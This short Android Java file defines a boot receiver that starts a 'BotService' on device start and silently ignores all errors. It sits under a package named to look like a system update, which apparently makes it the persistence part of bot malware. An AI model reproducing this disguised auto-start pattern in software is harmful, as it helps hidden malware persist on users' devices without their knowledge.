package com.system.update;
import android.content.*;
import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i){
        try{
            Intent svc = new Intent(c, BotService.class);
            if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) c.startForegroundService(svc);
            else c.startService(svc);
        }catch(Exception e){}
    }
}
